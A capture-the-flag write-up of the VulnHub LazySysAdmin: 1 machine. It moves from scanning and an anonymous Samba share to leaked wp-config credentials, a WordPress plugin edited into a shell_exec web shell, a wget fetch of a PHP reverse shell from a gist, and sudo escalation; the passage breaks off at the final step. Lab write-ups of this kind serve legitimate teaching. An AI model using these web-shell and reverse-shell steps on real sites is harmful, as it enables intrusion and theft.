This is a writeup for VulnHub's [LazySysAdmin: 1](https://www.vulnhub.com/entry/lazysysadmin-1,205/) challenge. It's almost a year since I did my last VulnHub challenge, [HackDay: Albania](https://www.vulnhub.com/entry/hackday-albania,167/).

### Host Discovery

I started by scanning my network in the range of IP addresses usually assigned by the DHCP server to new hosts. The VM is assigned the address 192.168.0.107.

```
$ nmap 192.168.0.100-120

Nmap scan report for 192.168.0.107
Host is up (0.00017s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
```

As we can see, the host is running several network services. We'll start by checking the HTTP service.

### HTTP Service

We're served a web page that looks like of some startup whose founder isn't very passionate to run the company.

![iDontCare](/images/posts/lazysysadmin-idontcare.png)

It has a `robots.txt` file.

```
User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/
```

Only `/Backnode_files/` has some files inside, and it doesn't seem to have anything useful.

### Moar Service Discovery

On our previous Nmap run we saw that the hsost is listening on several ports. We're going to see what services are running.

```
$ nmap 192.168.0.107 -A

It's running Samba for file sharing. Nice.

### Samba Dancing

Let's see if we can get anything out of the Samba service.

```
$ smbclient -L 192.168.0.107 -N

See the sharenames. We can't connect using `print$` and `IPC$` doesn't allow us to list files after connecting. But `share$` looks good.

```

`share$` doesn't allow us to put files into the server, but it allows us to get files. This means we're able to get any PHP file which code we need to see.

We can see that it has WordPress running. After some check, the WordPress is run at `/wordpress/` path instead of `/wp/`, since `/wp/` is an empty directory.

We can also see that the host is running on Apache.

```

### WordPress Loves Dolly

I proceed to check out the WordPress page.

![Sad WordPress Page](/images/posts/lazysysadmin-wordpress.png)

Its admin page is available here.

```
http://192.168.0.107/wp-admin/
```

It's not left vulnerable to SQL injection, so we need to find another way around.

On the Samba console, there's a `wp-config.php` file inside the `/wordpress/` directory. I downloaded it and see it has the following lines.

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
```

The `DB_USER` and `DB_PASSWORD` can be used to login to the WordPress admin panel.

![Hello Dolly](/images/posts/lazysysadmin-wp-admin.png)

See the text around the top right of the page?

```
So, take her wrap, fellas
```

It's a line from Louis Armstrong's song _Hello Dolly_. It's printed by a WordPress plugin called Hello Dolly.

### Dolly'll Never Gonna Give You Up

I went to the plugins page and edit the Hello Dolly plugin's `hello_dolly_get_lyric()` function to something like this.

```
function hello_dolly_get_lyric() {
  /** These are the lyrics to Hello Dolly */
  $lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
So, take her wrap, fellas
Find her an empty lap, fellas
Dolly'll never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
Golly, gee, fellas
Find her a vacant knee, fellas
Dolly'll never go away
Dolly'll never go away
Dolly'll never go away again";

  // Here we split it into lines
  $lyrics = explode( "\n", $lyrics );

  // And then randomly choose a line
  //return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
  $lyrics = "<pre>".shell_exec($_GET['cmd'])."</pre>";
  return  wptexturize($lyrics);
}
```

I commented the return instruction, add a line to execute shell command, and return the shell command result to be printed in place of the previous _Hello Dolly_ song lyrics.

![Aww Yeah](/images/posts/lazysysadmin-wp-rce.png)

### PHP Reverse Shell

I uploaded PHP reverse shell script for me to gain reverse shell access at GitHub using anonymous Gist feature.

```
https://gist.githubusercontent.com/anonymous/5cf1bb6324abcc8041c4f9e28d5f8424/raw/94a5905fca7a8a21ef4cda2cdc13e6511c7a2856/php-reverse-shell.php
```

Then, I had the Hello Dolly plugin downloaded it using `wget` by hitting this URL on my browser.

```
http://192.168.0.107/wordpress/wp-admin/index.php?cmd=wget+https%3A%2F%2Fgist.githubusercontent.com%2Fanonymous%2F5cf1bb6324abcc8041c4f9e28d5f8424%2Fraw%2F94a5905fca7a8a21ef4cda2cdc13e6511c7a2856%2Fphp-reverse-shell.php
```

Sweet. Now I set up `netcat` to listen to port 1234, the port my PHP reverse shell is connecting to.

```
$ nc -lnvp 1234
```

I accessed PHP reverse shell from my browser.

```
http://192.168.0.107/wordpress/wp-admin/php-reverse-shell.php
```

Now I got the reverse shell with the user privilege of www-data.

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I might have the reverse shell, but not a proper TTY yet. So I need to run this command from the reverse shell.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Exploring the Shell

At first, I tried connecting to MySQL locally since I couldn't connect to MySQL from remote host. But I didn't find anything useful there.

I tried to find exploitable SUID files, but there doesn't seem to be any that's exploitable.

```
$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/ping6
/bin/umount
/bin/mount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/at
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

There's a user with the name togie in the system.

```
$ ls -alh /home
total 12K
drwxr-xr-x  3 root  root  4.0K Aug 14 20:00 .
drwxr-xr-x 22 root  root  4.0K Aug 21 20:10 ..
drwxr-xr-x  3 togie togie 4.0K Aug 15 23:05 togie
```

The `/etc/passwd/` file is not writable and the `/etc/shadow` can't be read. I also don't seem to be able to register new cron jobs using www-data user.

www-data is not a sudoer, but togie is.

```
$ for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null

```

Using `netstat`, we can see that Nmap already identified all of the listening services.

```
$ netstat -tunlp

```

So I checked the files in `/var/www/html` directory to see if there's anything useful. `deets.txt` seems to contain something really sensitive there.

```
$ cat deets.txt
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345


```

It's togie's password. Nice!

### I am togie

togie is a sudoer, so we can do this.

```
$ sudo su
```

And perform this.

```
